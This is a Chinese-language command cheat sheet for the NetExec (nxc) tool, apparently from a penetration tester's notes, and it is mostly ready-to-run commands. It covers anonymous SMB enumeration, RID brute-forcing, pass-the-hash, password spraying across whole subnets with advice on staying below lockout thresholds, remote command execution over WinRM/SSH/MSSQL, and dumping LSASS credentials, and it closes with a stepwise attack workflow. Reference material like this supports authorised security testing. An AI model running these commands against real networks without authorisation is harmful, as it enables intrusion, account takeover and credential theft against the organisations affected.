---
cmd_type: Recon
service: SMB
os: General
tags:
  - cmd
syntax: nxc smb <ip> -u '' -p '' --shares
risk: Low
---

# NetExec (nxc) 使用指南

## 用途 / 适用场景

NetExec（命令 `nxc`）是 crackmapexec 的继任者，社区已迁移到 nxc，命令由 `crackmapexec`/`cme` 换成 `nxc`。用于内网横向的批量侦察与执行：SMB 共享/用户/组枚举、密码喷洒、LDAP 信息收集、WinRM/SSH/MSSQL 远程执行命令，以及加载模块（lsassy、zerologon 等）做凭据窃取与漏洞检测。

> 迁移对照：老命令 `crackmapexec smb ...` → 新命令 `nxc smb ...`，参数基本一致。

## 关键命令（SMB 模块）

### 存活探测与基础信息

```bash
# 匿名空凭据探测 + 基础信息
nxc smb <IP>
nxc smb <IP> -u '' -p ''

# 列出共享
nxc smb <IP> -u '' -p '' --shares

# 枚举用户
nxc smb <IP> -u '' -p '' --users

# 查看当前已建立的会话
nxc smb <IP> -u '' -p '' --sessions

# 查看密码策略
nxc smb <IP> -u '' -p '' --pass-pol

# 枚举本地/域组
nxc smb <IP> -u <USER> -p <PASS> --groups

# RID 爆破枚举所有用户
nxc smb <IP> -u <USER> -p <PASS> --rid-brute
```

### 凭据验证

```bash
# 验证单条凭据
nxc smb <IP> -u <USER> -p <PASS>

# 验证 NTLM 哈希（Pass-the-Hash）
nxc smb <IP> -u <USER> -H <NTLM_HASH>

# 批量验证用户/密码组合
nxc smb <IP> -u users.txt -p passwords.txt

# 指定域
nxc smb <IP> -d <DOMAIN> -u <USER> -p <PASS>
```

## 密码喷洒

```bash
# 对整个网段用同一密码做密码喷洒，命中后继续（不因命中中断）
nxc smb <SUBNET> -u users.txt -p 'Password1' --continue-on-success

# 指定域的喷洒
nxc smb <SUBNET> -u users.txt -p 'Password1' -d <DOMAIN> --continue-on-success
```

> 喷洒要点：先看 `--pass-pol` 确认账户锁定阈值，喷洒节奏别超阈值；一个密码配一整个用户列表，不要一个用户配一整个密码列表。

## LDAP 模块

```bash
# 收集 BloodHound 数据（-c all 收集全部集合）
nxc ldap <IP> -u <USER> -p <PASS> --bloodhound -c all --dns-server <IP>

# 枚举域用户
nxc ldap <IP> -u <USER> -p <PASS> --users

# 自定义 LDAP 查询
nxc ldap <IP> -u <USER> -p <PASS> --query '(objectClass=user)'
```

## WinRM / SSH / MSSQL 执行命令

```bash
# WinRM 执行命令
nxc winrm <IP> -u <USER> -p <PASS> -x 'whoami'

# SSH 执行命令
nxc ssh <IP> -u <USER> -p <PASS> -x 'id'

# MSSQL 执行命令（需 xp_cmdshell 可用）
nxc mssql <IP> -u <USER> -p <PASS> -x 'whoami'
```

## 模块（-M）

```bash
# lsassy：远程 dump lsass 凭据（需要高权限）
nxc smb <IP> -u <USER> -p <PASS> -M lsassy

# zerologon 检测（CVE-2020-1472）
nxc smb <IP> -u '' -p '' -M zerologon

# 查看某模块用法
nxc smb -M lsassy --help

# 列出全部可用模块
nxc smb -L
```

## 参数说明

| 参数 | 说明 |
| --- | --- |
| `-u` | 用户名，`-u ''` 表示匿名 |
| `-p` | 密码，`-p ''` 匿名 |
| `-H` | NTLM 哈希（Pass-the-Hash） |
| `-d` | 域名 / 工作组 |
| `--shares` | 枚举 SMB 共享 |
| `--users` | 枚举用户 |
| `--sessions` | 查看已建立会话 |
| `--pass-pol` | 查看密码策略 |
| `--groups` | 枚举组 |
| `--rid-brute` | RID 爆破枚举用户 |
| `--continue-on-success` | 命中后继续喷洒 |
| `--bloodhound` | 收集 BloodHound 数据 |
| `-c` | 指定 BloodHound 收集集合（`all`/`sessions`/`loggedon` 等） |
| `--dns-server` | 指定 DNS 服务器 |
| `--query` | 自定义 LDAP 查询 |
| `-x` | 在目标上执行命令 |
| `-M` | 加载模块 |
| `-L` | 列出模块 |

## 实战流程

```bash
# 1. 匿名探测 + 共享 + 密码策略
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u '' -p '' --pass-pol

# 2. 拿用户列表（匿名 RID 爆破 / 已获凭据后枚举）
nxc smb <IP> -u '' -p '' --rid-brute

# 3. 密码喷洒
nxc smb <SUBNET> -u users.txt -p 'Password1' --continue-on-success

# 4. 命中后枚举共享与会话
nxc smb <IP> -u <USER> -p <PASS> --shares
nxc smb <IP> -u <USER> -p <PASS> --sessions

# 5. 高权限时 dump 凭据 / 执行命令
nxc smb <IP> -u <USER> -p <PASS> -M lsassy
nxc winrm <IP> -u <USER> -p <PASS> -x 'whoami'
```

## 常见坑

- **SMB signing**：目标若强制 SMB 签名，会影响 lsassy 等需要读写命名管道的模块；`nxc smb <IP>` 输出会标注 `SMB signing: required/not required`，签名开启时优先走 WinRM/SSH 通道。
- **账户锁定**：密码喷洒前先看 `--pass-pol`；不加 `--continue-on-success` 时命中即停，加后继续。
- **空凭据要显式写**：`-u '' -p ''` 才是匿名，漏写会走交互或默认值。
- **LDAP 需要 DNS**：LDAP 模块解析域控/名称依赖 DNS，配合 `--dns-server <IP>` 指定。
- **MSSQL 执行命令依赖 xp_cmdshell**：未启用时用 `-M mssql_priv` 提权启用。
- **老教程命令不通用**：网上旧文章是 `crackmapexec`/`cme`，现在统一用 `nxc`，参数基本一致。

## 参考开源项目

- NetExec — https://github.com/Pennyw0rth/NetExec
